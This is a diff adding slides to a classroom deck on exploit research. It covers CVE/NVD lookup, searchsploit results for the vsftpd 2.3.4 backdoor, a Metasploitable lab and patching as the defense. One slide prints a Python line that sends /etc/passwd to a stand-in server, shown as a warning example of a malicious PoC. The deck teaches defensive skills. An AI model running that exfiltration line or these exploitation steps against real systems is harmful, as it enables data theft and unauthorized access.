@@ -70,6 +70,26 @@ By the end of this unit you can:
 
 ---
 
+# Why this unit matters
+
+- Most real intrusions don't use a brand-new "0-day."
+- They reuse a **known** bug in **old, unpatched** software.
+- Attackers and defenders shop from the **same public shelf** of exploits.
+
+> Whoever acts on the version number first — attacker or defender — wins.
+
+---
+
+# An analogy: a known broken lock
+
+- A locksmith publishes: "Model X-200 locks pop open with a paperclip."
+- A burglar reads it and tries it on old locks.
+- A **smart owner** reads the same notice and **replaces the lock**.
+
+> The CVE/exploit world is that public notice — for software.
+
+---
+
 <!-- _class: lead -->
 
 # ⚖️ Read this before anything else
@@ -142,6 +162,16 @@ The **version number** is the key that unlocks the whole search.
 
 ---
 
+# Why one shared ID helps everyone
+
+- A vendor's advisory, a news article, and a scanner all say `CVE-2011-2523`.
+- You know they mean the **exact same** bug — no confusion.
+- You can search any database by that ID and land on the same vulnerability.
+
+> Before CVEs, the same bug had five different names. The ID ended the chaos.
+
+---
+
 # What is the NVD?
 
 - **NVD** = **N**ational **V**ulnerability **D**atabase (`nvd.nist.gov`).
@@ -165,6 +195,25 @@ A **0–10 severity score** for a vulnerability.
 | 9.0–10.0 | Critical |
 
 > CVSS tells you *how bad* — it helps defenders decide what to patch first.
+
+---
+
+# Check your understanding
+
+> A scan reports `Apache httpd 2.4.49`.
+> What is the **single most useful** piece of that line for finding an exploit, and why?
+
+<!-- Pause. Let students answer before the next slide. -->
+
+---
+
+# Answer
+
+- The piece that matters most is the **version**: `2.4.49`.
+- "Apache" alone is too broad — millions run Apache safely.
+- The **exact version** is the search key into CVE/NVD/Exploit-DB.
+
+> Software name narrows it; the **version number** unlocks it.
 
 ---
 
@@ -256,6 +305,33 @@ Reads like a table:
 
 ---
 
+# What the output looks like
+
+```
+------------------------------------- ----------------------
+ Exploit Title                         Path
+------------------------------------- ----------------------
+ vsftpd 2.3.4 - Backdoor Command       unix/remote/49757.py
+   Execution
+ vsftpd 2.3.4 - Backdoor Command       unix/remote/17491.rb
+   Execution (Metasploit)
+------------------------------------- ----------------------
+```
+
+- Two hits: a **Python** PoC and a **Metasploit** module.
+
+---
+
+# Reading that result
+
+- **Title** says the target (`vsftpd 2.3.4`) and the effect (`Backdoor Command Execution`).
+- **Path** ends in `.py` (Python) or `.rb` (Ruby / Metasploit).
+- `unix/remote` = a remote attack against a Unix-like target.
+
+> The path's file type tells you what language you'll be reading next.
+
+---
+
 # Viewing and copying an exploit
 
 ```
@@ -277,6 +353,25 @@ searchsploit -m <path-shown>    # mirror (copy) it to your folder
 | Trust | Still read it! | **Definitely** read it |
 
 > Neither earns blind trust. Both get read before they run.
+
+---
+
+# Check your understanding
+
+> Your `searchsploit` search returns five results, but only one mentions your exact version and platform.
+
+What **two** things should you confirm before trusting any of them?
+
+<!-- Pause. -->
+
+---
+
+# Answer
+
+- The **service/version** matches your target exactly (or is compatible).
+- The **platform/OS** matches (Linux vs. Windows).
+
+> A close-sounding title is not a match. Confirm version **and** platform.
 
 ---
 
@@ -366,6 +461,30 @@ If the code does anything you **can't explain**, or that looks destructive or sn
 
 ---
 
+# A red flag, up close
+
+Imagine you find this buried in a "PoC":
+
+```python
+import urllib.request
+urllib.request.urlopen("http://198.51.100.9/c?d=" + open("/etc/passwd").read())
+```
+
+- It reads your **own** files and ships them to a stranger's server.
+- That has nothing to do with the target. **Stop. Flag it.**
+
+---
+
+# Why a "PoC" might attack you
+
+- Anyone can upload code to the internet — including bad actors.
+- "Just run it to see" is exactly the trap they're counting on.
+- The exploit may target the **operator** (you), not the listed victim.
+
+> The author is a stranger. Read every line before you trust them.
+
+---
+
 # Guided practice — annotate together
 
 As a class, take the chosen exploit and:
@@ -385,6 +504,35 @@ As a class, take the chosen exploit and:
 - The standard PoC has **no destructive code** — but you still verify and say so.
 
 > A clean version → CVE → exploit → shell story.
+
+---
+
+# Where this backdoor came from
+
+- In 2011, attackers briefly slipped malicious code into vsftpd's source.
+- Anyone who downloaded that copy got a hidden **root backdoor**.
+- It's a real-world lesson in **supply-chain** risk — and why you read code.
+
+> The backdoor wasn't a normal bug; someone *planted* it. The CVE documents it.
+
+---
+
+# Check your understanding
+
+> Before running an exploit, name **three** things you must understand about it.
+
+<!-- Pause and collect answers. -->
+
+---
+
+# Answer (any three)
+
+- What it **targets** (service, version, platform).
+- What the **payload** does (shell? add a user?).
+- **Where** the IP / port / parameters live.
+- Whether **anything is destructive** or phones home.
+
+> If you can't answer these, you are not ready to run it.
 
 ---
 
@@ -459,6 +607,22 @@ For the vsftpd backdoor, a **root shell** opens on port 6200 — `whoami` return
 
 ---
 
+# What success looks like
+
+After running the adapted exploit, you should see:
+
+```
+$ whoami
+root
+$ id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+- `uid=0` is the proof: you are **root**.
+- Screenshot this — it's your evidence of access.
+
+---
+
 # Match, or it "won't work"
 
 The #1 reason a beginner says "exploits don't work" is a **mismatch**:
@@ -482,6 +646,26 @@ The #1 reason a beginner says "exploits don't work" is a **mismatch**:
 4. **Note** exactly which lines you changed and what each does.
 
 <!-- Walk around. Each student should explain why their exploit matches AND what each edited line does. -->
+
+---
+
+# Check your understanding
+
+> You run a Windows exploit against your Linux Metasploitable box and it fails immediately.
+
+Is the exploit **broken**? What's actually wrong?
+
+<!-- Pause. -->
+
+---
+
+# Answer
+
+- The exploit is probably **fine** — it just doesn't **match**.
+- A Windows exploit cannot work against a Linux target.
+- This is a **matching** problem (platform/OS), not a broken tool.
+
+> "It doesn't work" usually means "I picked the wrong target match."
 
 ---
 
@@ -528,6 +712,35 @@ The #1 reason a beginner says "exploits don't work" is a **mismatch**:
 | Vulnerable version | Fixed by |
 |--------------------|----------|
 | vsftpd **2.3.4** (backdoored) | Upgrade to a clean vsftpd build |
+
+---
+
+# Why old software is the easy target
+
+- A known CVE means the exploit is already **written and public**.
+- Unpatched software is a door that's been **left open on purpose**.
+- End-of-life software will **never** get a fix — the door stays open forever.
+
+> Attackers scan the whole internet for old versions. Patching closes the door.
+
+---
+
+# Check your understanding
+
+> You rooted a box because it ran an old, vulnerable service.
+> Name the **primary defense** that would have stopped you, and why it works.
+
+<!-- Pause. -->
+
+---
+
+# Answer
+
+- **Patching / upgrading** to the fixed version.
+- It **removes the vulnerable code**, so the exploit has nothing to hit.
+- Bonus: retire **end-of-life** software that can't be patched.
+
+> No vulnerable version → no matching exploit → no shell.
 
 ---
 
